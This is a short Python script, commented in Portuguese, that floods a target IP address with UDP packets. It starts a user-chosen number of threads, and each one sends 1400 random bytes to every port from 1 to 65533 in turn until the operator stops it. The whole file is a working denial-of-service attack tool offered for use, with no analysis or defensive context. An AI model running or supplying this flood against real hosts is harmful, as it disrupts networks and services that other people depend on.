from sys import argv
import socket
from os import urandom
from threading import Thread

def ataque(ip, id):  #Função que gera o ataque UDP
	sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
	bytes = urandom(1400)  #Gera uma sequência de bytes aleatórios
	total_enviado = 0
	porta = 1
	while(ativo):
		sock.sendto(bytes, (ip, porta))
		total_enviado += 1
		porta += 1
		if(porta == 65534):
			porta = 1
	print("[+] Thread " + str(id) + " terminada, enviou " +
		  str(total_enviado) + " pacotes.")


if(len(argv) != 3):
	print("Modo de uso:")
	print(argv[0] + " <ip_alvo> <numero_thread>")
	exit(-1)

ativo = True
thread_dos = []
ip = argv[1]
n = int(argv[2])

for i in range(n):  #Inicia N thread
	thread_dos.append(Thread(target=ataque, args=(ip, i,)))
	thread_dos[-1].daemon = True
	thread_dos[-1].start()

while(ativo):
	try:
		resposta = int(input("Digite 1 para terminar: "))
	except:
		continue
	
	if(resposta == 1):
		ativo = False
		for thread_atual in thread_dos: #Aguarda todas thread terminar
			thread_atual.join()
